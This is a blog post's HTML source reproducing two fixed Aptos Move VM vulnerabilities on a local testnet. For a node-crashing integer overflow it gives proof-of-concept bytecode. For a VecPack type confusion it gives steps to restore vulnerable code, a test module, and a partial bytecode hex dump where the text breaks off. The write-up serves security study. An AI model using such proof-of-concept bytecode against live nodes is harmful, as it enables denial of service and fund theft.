@@ -1,0 +1,246 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Reproduce two critical bugs in Move VM and know why - Y1kang</title><link rel="manifest" href="/blogs/manifest.json"><meta name="application-name" content="Y1kang"><meta name="msapplication-TileImage" content="/images/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Y1kang"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="#1: The Crash BugA bug in the move virtual machine can cause crash in aptos applications. Introductionhttps:&amp;#x2F;&amp;#x2F;medium.com&amp;#x2F;numen-cyber-labs&amp;#x2F;analysis-of-the-first-critical-0-day-vulnerability-of-aptos-mo"><meta property="og:type" content="blog"><meta property="og:title" content="Reproduce two critical bugs in Move VM and know why"><meta property="og:url" content="http://y1kang.com/2023/03/06/Move-compiler/"><meta property="og:site_name" content="Y1kang"><meta property="og:description" content="#1: The Crash BugA bug in the move virtual machine can cause crash in aptos applications. Introductionhttps:&amp;#x2F;&amp;#x2F;medium.com&amp;#x2F;numen-cyber-labs&amp;#x2F;analysis-of-the-first-critical-0-day-vulnerability-of-aptos-mo"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/1*Qq4bL4ZbG4GqoWqkiXOrmA.jpeg"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230504152631326.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230504132313778.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230519133132016.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230605191543782.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230605193130062.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230605194812792.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230605194901124.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230605195133355.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230605195821389.png"><meta property="og:image" content="http://y1kang.com/2023/03/06/Move-compiler/image-20230605200035176.png"><meta property="article:published_time" content="2023-03-06T07:59:04.812Z"><meta property="article:modified_time" content="2024-02-26T01:48:26.628Z"><meta property="article:author" content="y1k"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://y1kang.com/2023/03/06/Move-compiler/1*Qq4bL4ZbG4GqoWqkiXOrmA.jpeg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://y1kang.com/2023/03/06/Move-compiler/"},"headline":"Reproduce two critical bugs in Move VM and know why","image":["http://y1kang.com/2023/03/06/Move-compiler/image-20230504152631326.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230504132313778.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230519133132016.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230605191543782.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230605193130062.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230605194812792.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230605194901124.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230605195133355.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230605195821389.png","http://y1kang.com/2023/03/06/Move-compiler/image-20230605200035176.png"],"datePublished":"2023-03-06T07:59:04.812Z","dateModified":"2024-02-26T01:48:26.628Z","author":{"@type":"Person","name":"y1k"},"publisher":{"@type":"Organization","name":"Y1kang","logo":{"@type":"ImageObject","url":"http://y1kang.com/images/favicon.ico"}},"description":"#1: The Crash BugA bug in the move virtual machine can cause crash in aptos applications. Introductionhttps:&#x2F;&#x2F;medium.com&#x2F;numen-cyber-labs&#x2F;analysis-of-the-first-critical-0-day-vulnerability-of-aptos-mo"}</script><link rel="canonical" href="http://y1kang.com/2023/03/06/Move-compiler/"><link rel="icon" href="/blogs/images/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/blogs/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-menu"><a class="navbar-item navbar-logo" href="/blogs/"><img src="/blogs/images/favicon.ico" alt="Y1kang" height="28"></a><div class="navbar-start"><a class="navbar-item" href="/blogs/about">About</a><a class="navbar-item" href="/blogs/">Blogs</a></div><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"></div></div><h1 class="title is-3 is-size-4-mobile">Reproduce two critical bugs in Move VM and know why</h1><div class="content"><h1 id="1-The-Crash-Bug"><a href="#1-The-Crash-Bug" class="headerlink" title="#1: The Crash Bug"></a>#1: The Crash Bug</h1><p>A bug in the move virtual machine can cause crash in aptos applications.</p>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a target="_blank" rel="noopener" href="https://medium.com/numen-cyber-labs/analysis-of-the-first-critical-0-day-vulnerability-of-aptos-move-vm-8c1fd6c2b98e">https://medium.com/numen-cyber-labs/analysis-of-the-first-critical-0-day-vulnerability-of-aptos-move-vm-8c1fd6c2b98e</a></p>
+<p>The Move programming language is used in many well-known projects, like Aptos and Sui.</p>
+<blockquote>
+<p>Move virtual machine (movevm) like Ethereum Virtual Machine evm are the same, where it needs to compile the source code into byte code and exectued in the virtual machine.</p>
+</blockquote>
+<span id="more"></span>
+<img src="/2023/03/06/Move-compiler/1*Qq4bL4ZbG4GqoWqkiXOrmA.jpeg" class="" title="img">
+
+<ul>
+<li>the bytecode is loaded in through the function execute_script</li>
+<li>Execute load_script function, this function is mainly used to deserialize the bytecode, and verify whether the bytecode is legal, if the verification fails, it will return as a failure</li>
+<li>After successful verification, the real bytecode code is then executed</li>
+<li>Execute the bytecode, access or modify the state of global storage, including resources, modules</li>
+</ul>
+<p><strong>Verification Module</strong></p>
+<p>before the real execution of bytecode code, verification of bytecode is performed. The verification can be subdivided into a number of sub-processes respectively.</p>
+<ul>
+<li>*<strong>BoundsChecker*</strong>, is mainly used to check the boundary security of the module and script. This includes checking the boundary of signature, constants, etc.</li>
+<li>*<strong>DuplicationChecker*</strong>, a module that implements a checker to verify whether each vector in a CompiledModule contains different values</li>
+<li>*<strong>SignatureChecker*</strong>, which checks that the field structure is correct when the signature is used for function parameters, local variables, and structure members</li>
+<li>*<strong>InstructionConsistency*</strong>, which verifies instruction consistency</li>
+<li>*<strong>Constants*</strong> are used to verify that constants are of the original type and that the data of constants are correctly serialized to their type</li>
+<li>*<strong>CodeUnitVerifier*</strong>, to verify the correctness of the function body code, via stack_usage_verifier.rs and abstract_interpreter.rs respectively</li>
+<li>*<strong>script_signature*</strong>, to verify that a script or entry function is a valid signature</li>
+</ul>
+<p><strong>CodeUnitVerifier</strong></p>
+<p>The vulnerability existed in the logic of checking stack size check when verifying blocks of code.</p>
+<p>Specifically, <code>stack_size_increment</code> can be indirectly controlled by constructing an oversized <code>num_pushes</code>, resulting in an integer overflow vulnerability.</p>
+<h2 id="Reproduction"><a href="#Reproduction" class="headerlink" title="Reproduction"></a>Reproduction</h2><p>install aptos-cli tool:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL &quot;https://aptos.dev/scripts/install_cli.py&quot; | python3</span><br></pre></td></tr></table></figure>
+
+
+
+<p>run aptos node</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone git@github.com:aptos-labs/aptos-core.git ~/aptos-core &amp;&amp; cd ~/aptos-core</span><br><span class="line"></span><br><span class="line">$ cargo run -p aptos -- node run-local-testnet --with-faucet --faucet-port 8081 --force-restart --assume-yes</span><br></pre></td></tr></table></figure>
+
+
+
+<p>poc bytecode file</p>
+<img src="/2023/03/06/Move-compiler/image-20230504152631326.png" class="" title="image-20230504152631326">
+
+
+
+<p>Disassemble the bytecode. We can see the code at line 1 and line 2 are two VecUnpack instructions. </p>
+<p>The function of VecUnpack is to push all the data to the stack when the vector object is encountered in the code. That said the instruction will unpack a statically known number of elements onto the stack. </p>
+<p>Thus, two lines of code will let VM add 3315214543476364830 and 18394158839224997406 via <code>stack_size_increment += num_pushes;</code>, which is greater than the maximum value of u64 (18446744073709551615). This cause add overflow panic featured by Rust and let the Aptos node crash down.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">move new Test</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> 1.<span class="built_in">mv</span> Test/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> Test</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">move sandbox view 1.<span class="built_in">mv</span></span></span><br><span class="line"></span><br><span class="line">// Move bytecode v4</span><br><span class="line">script &#123;</span><br><span class="line"></span><br><span class="line">main&lt;Ty0: drop, Ty1: drop&gt;(Arg0: u8) &#123;</span><br><span class="line">B0:</span><br><span class="line">	0: LdU64(3323940208748926750)</span><br><span class="line">	1: VecUnpack(2, 3315214543476364830)</span><br><span class="line">	2: VecUnpack(2, 18394158839224997406)</span><br><span class="line">	3: Ret</span><br><span class="line">B1:</span><br><span class="line">	4: Ret</span><br><span class="line">B2:</span><br><span class="line">	5: Ret</span><br><span class="line">B3:</span><br><span class="line">	6: Ret</span><br><span class="line">B4:</span><br><span class="line">	7: Ret</span><br><span class="line">B5:</span><br><span class="line">	8: Ret</span><br><span class="line">B6:</span><br><span class="line">	9: Ret</span><br><span class="line">B7:</span><br><span class="line">	10: Ret</span><br><span class="line">B8:</span><br><span class="line">	11: Ret</span><br><span class="line">B9:</span><br><span class="line">	12: Ret</span><br><span class="line">B10:</span><br><span class="line">	13: Ret</span><br><span class="line">B11:</span><br><span class="line">	14: Ret</span><br><span class="line">B12:</span><br><span class="line">	15: Ret</span><br><span class="line">B13:</span><br><span class="line">	16: Ret</span><br><span class="line">B14:</span><br><span class="line">	17: Ge</span><br><span class="line">	18: Ret</span><br><span class="line">B15:</span><br><span class="line">	19: Or</span><br><span class="line">	20: Sub</span><br><span class="line">	21: Or</span><br><span class="line">	22: VecPopBack(2)</span><br><span class="line">	23: Ret</span><br><span class="line">B16:</span><br><span class="line">	24: FreezeRef</span><br><span class="line">	25: VecUnpack(2, 163587547629229598)</span><br><span class="line">	26: Ret</span><br><span class="line">B17:</span><br><span class="line">	27: Ret</span><br><span class="line">B18:</span><br><span class="line">	28: Ret</span><br><span class="line">B19:</span><br><span class="line">	29: Ret</span><br><span class="line">B20:</span><br><span class="line">	30: Ret</span><br><span class="line">B21:</span><br><span class="line">	31: Or</span><br><span class="line">	32: Or</span><br><span class="line">	33: Sub</span><br><span class="line">	34: Ret</span><br><span class="line">B22:</span><br><span class="line">	35: FreezeRef</span><br><span class="line">	36: VecPopBack(2)</span><br><span class="line">	37: Ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Crash the node:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">aptos move run-script --compiled-script-path 1.<span class="built_in">mv</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>The node backend logs show:</p>
+<img src="/2023/03/06/Move-compiler/image-20230504132313778.png" class="" title="image-20230504132313778">
+
+
+
+<h1 id="2-The-Loss-of-Found-Bug-Type-Confusion-Bug"><a href="#2-The-Loss-of-Found-Bug-Type-Confusion-Bug" class="headerlink" title="#2: The Loss of Found Bug &#x2F; Type Confusion Bug"></a>#2: The Loss of Found Bug &#x2F; Type Confusion Bug</h1><p>A bug in the move virtual machine can cause loss of found in aptos applications due to type confusion problem.</p>
+<h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p>Lets first see the README document in the move repo for bytecode verifier. <a target="_blank" rel="noopener" href="https://github.com/move-language/move/tree/96d7dd69c5fe2e1aa2c36831c8d0154c3e3acfe0/language/move-bytecode-verifier">https://github.com/move-language/move/tree/96d7dd69c5fe2e1aa2c36831c8d0154c3e3acfe0/language/move-bytecode-verifier</a></p>
+<p>So here the bug is happened at the type safety checking stage.</p>
+<blockquote>
+<h2 id="Type-Safety"><a href="#Type-Safety" class="headerlink" title="Type Safety"></a>Type Safety</h2><p>The second phase of the analysis checks that each operation, primitive or defined function, is invoked with arguments of appropriate types. The operands of an operation are values located either in a local variable or on the stack. The types of local variables of a function are already provided in the bytecode. However, the types of stack values are inferred. This inference and the type checking of each operation can be done separately for each block. Since the stack height at the beginning of each block is <em>n</em> and does not go below <em>n</em> during the execution of the block, we only need to model the suffix of the stack starting at <em>n</em> for type checking the block instructions. We model this suffix using a stack of types on which types are pushed and popped as the instruction stream in a block is processed. Only the type stack and the statically-known types of local variables are needed to type check each instruction.</p>
+</blockquote>
+<p>We can see the fix commit is to add additional check in <code>VecPack</code> operator. As seen below, previous code didn’t check the consistency of operand types in a vector while after code checks.</p>
+<img src="/2023/03/06/Move-compiler/image-20230519133132016.png" class="" title="image-20230519133132016">
+
+<p>We see how VecPack specifically works in Move VM.</p>
+<p><code>aptos move init --name test_move</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module test::test_move&#123;</span><br><span class="line">	use std::vector;</span><br><span class="line">	public fun test() &#123;</span><br><span class="line">			let v = vector::empty&lt;u64&gt;();</span><br><span class="line">			vector::push_back(&amp;mut v, 5);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>move disassemble --name test_move</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">module cafe.test_move &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public test() &#123;</span><br><span class="line">L0:     v: vector&lt;u64&gt;</span><br><span class="line">B0:</span><br><span class="line">        0: VecPack(2, 0)</span><br><span class="line">        1: StLoc[0](v: vector&lt;u64&gt;)</span><br><span class="line">        2: MutBorrowLoc[0](v: vector&lt;u64&gt;)</span><br><span class="line">        3: LdU64(5)</span><br><span class="line">        4: VecPushBack(2)</span><br><span class="line">        5: Ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The first instruction is <code>VecPack</code>. This operator is to initialize a vector. The first parameter represents a type index, which will be parsed into a specific type when compiling. In this example, u64 is the type for this vector. The second parametere represents the number of elements when initializing. Here because we use <code>vector::empty&lt;u64&gt;()</code>, we do not hv element to initialize the vector and the parameter is 0. For example, if we use <code>vector&lt;u64&gt;[0,1,2];</code> , the second parameter will be 3.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// Move bytecode v5</span><br><span class="line">module cafe.test_move &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public test() &#123;</span><br><span class="line">L0:     a: u8</span><br><span class="line">L1:     num: u8</span><br><span class="line">L2:     v: vector&lt;u8&gt;</span><br><span class="line">B0:</span><br><span class="line">        0: VecPack(2, 0)</span><br><span class="line">        1: StLoc[2](v: vector&lt;u8&gt;)</span><br><span class="line">        2: MutBorrowLoc[2](v: vector&lt;u8&gt;)</span><br><span class="line">        3: LdU8(1)</span><br><span class="line">        4: VecPushBack(2)</span><br><span class="line">        5: MutBorrowLoc[2](v: vector&lt;u8&gt;)</span><br><span class="line">        6: VecPopBack(2)</span><br><span class="line">        7: StLoc[0](a: u8)</span><br><span class="line">        8: ImmBorrowLoc[0](a: u8)</span><br><span class="line">        9: Call[0](print&lt;u8&gt;(&amp;u8))</span><br><span class="line">        10: Ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>That’s introduction of <code>VecPack</code>. Then lets reproduce this vulnerability in an example.</p>
+<h2 id="Reproduction-1"><a href="#Reproduction-1" class="headerlink" title="Reproduction"></a>Reproduction</h2><p>First, clone the aptos project:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aptos-labs/aptos-core.git</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Switch to a old commit version. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout 649fb13e021f8e6a4d28c3410767a9af6106dbb1</span><br><span class="line">git switch -c fixed</span><br></pre></td></tr></table></figure>
+
+
+
+<p>The code in this commit already fixed the bug. So we need to replace the move version in code here.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Replace any &quot;77750b37bb3663d00a7c4058937fed42ceb3089e&quot; to &quot;59265662d0a44ba53b09ba3c4b2248efdf08c622&quot; in the repo.</span><br><span class="line"></span><br><span class="line">Replace any &quot;github.com/aptos-labs/move&quot; to &quot;github.com/move-language/move&quot; in the repo.</span><br><span class="line"></span><br><span class="line">git add *</span><br><span class="line">git commit -m &quot;replace vulnerable move commit 59265662d0a44ba53b09ba3c4b2248efdf08c622&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>First, open a tmux session and setup a local test aptos environment by following command:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo run --release -p aptos -- node run-local-testnet --with-faucet --faucet-port 8081 --force-restart --assume-yes</span><br></pre></td></tr></table></figure>
+
+<p>This command will also build a <code>aptos-cli</code> tool at <code>aptos-core/target/release/aptos</code> for us to interact with the validator node.</p>
+<p>We can copy this tool to our shell path <code>cp target/release/aptos ~/bin</code></p>
+<p>Open another tmux session and publish module to the aptos network.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aptos init</span><br><span class="line">aptos account fund-with-faucet --account default --amount 100000000</span><br></pre></td></tr></table></figure>
+
+<p>Now we published a coin called TestCoin to the local aptos network.</p>
+<p>TestCoin code:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">module TestCoin::test_coin &#123;</span><br><span class="line"></span><br><span class="line">    use aptos_framework::coin;</span><br><span class="line">    use std::debug;</span><br><span class="line">    use std::signer;</span><br><span class="line"></span><br><span class="line">    struct TestCoin &#123;&#125;</span><br><span class="line"></span><br><span class="line">    struct OneCap has drop &#123;&#125;</span><br><span class="line"></span><br><span class="line">    struct TwoCap has drop &#123;&#125;</span><br><span class="line"></span><br><span class="line">    fun init_module(sender: &amp;signer) &#123;</span><br><span class="line">        aptos_framework::managed_coin::initialize&lt;TestCoin&gt;(</span><br><span class="line">            sender,</span><br><span class="line">            b&quot;Test Coin&quot;,</span><br><span class="line">            b&quot;Test&quot;,</span><br><span class="line">            6,</span><br><span class="line">            false,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun balance_of(owner: address) &#123;</span><br><span class="line">        let balance = coin::balance&lt;TestCoin&gt;(owner);</span><br><span class="line">        debug::print(&amp;balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun get_one_cap(): OneCap &#123;</span><br><span class="line">        return OneCap&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun get_two_cap(): TwoCap &#123;</span><br><span class="line">        return TwoCap&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public fun test(one_cap: OneCap)</span><br><span class="line">    &#123;</span><br><span class="line">        debug::print(&amp;b&quot;hello&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>We mainly focus on two structs defined here. one is called <code>OneCap</code>, another is called <code>TwoCap</code>.</p>
+<p>We have also a function called <code>test</code>, which will print a “hello” being invoked when the parameter is <code>OneCap  </code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptos move publish --named-addresses TestCoin=default</span><br></pre></td></tr></table></figure>
+
+
+
+<p>As the fix commit shows, we can use VecPack to pack a element of a type into anther targeted type of vector, which later unpacking this vector will give us the targeted type.</p>
+<p>Our original script looks like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">script &#123;</span><br><span class="line">    use std::vector;</span><br><span class="line"></span><br><span class="line">    fun poc(account: &amp;signer) &#123;</span><br><span class="line">        let onecap = TestCoin::test_coin::get_one_cap();</span><br><span class="line">        let twocap = TestCoin::test_coin::get_two_cap();</span><br><span class="line">        let v = vector[twocap];</span><br><span class="line">        TestCoin::test_coin::test(onecap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This is a valid script, we get a <code>OneCap</code> instance and call <code>test</code> with this <code>onecap</code>.</p>
+<img src="/2023/03/06/Move-compiler/image-20230605191543782.png" class="" title="image-20230605191543782">
+
+<p>This the details of the above bytecode (move provide a document to eplain their bytecode format <a target="_blank" rel="noopener" href="https://github.com/move-language/move/blob/main/language/documentation/spec/vm.md">https://github.com/move-language/move/blob/main/language/documentation/spec/vm.md</a>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">MAGIC</span><br><span class="line">a11c eb0b</span><br><span class="line"></span><br><span class="line">VERSION</span><br><span class="line">0500 0000</span><br><span class="line"></span><br><span class="line">TABLE_COUNT</span><br><span class="line">06    </span><br><span class="line"></span><br><span class="line">MODULE_HANDLES</span><br><span class="line">01 00 02 -&gt; 00 00</span><br><span class="line"></span><br><span class="line">STRUCT_HANDLES</span><br><span class="line">02 02 08 -&gt; 00 01 02 00</span><br><span class="line">						00 02 02 00</span><br><span class="line"></span><br><span class="line">FUNCTION_HANDLES</span><br><span class="line">03 0A 0F -&gt; 00 03 02 03 00 -&gt; get_one_cap()</span><br><span class="line">						00 04 02 04 00 -&gt; get_two_cap()</span><br><span class="line">						00 05 03 02 00 -&gt; test(cap)</span><br><span class="line"></span><br><span class="line">SIGNATURES</span><br><span class="line">05 19 12 -&gt; 01 06 0c -&gt; signer</span><br><span class="line">						03 08 00 08 01 0A 08 01 -&gt; </span><br><span class="line">						00 </span><br><span class="line">						01 08 00 -&gt; OneCap</span><br><span class="line">						01 08 01 -&gt; 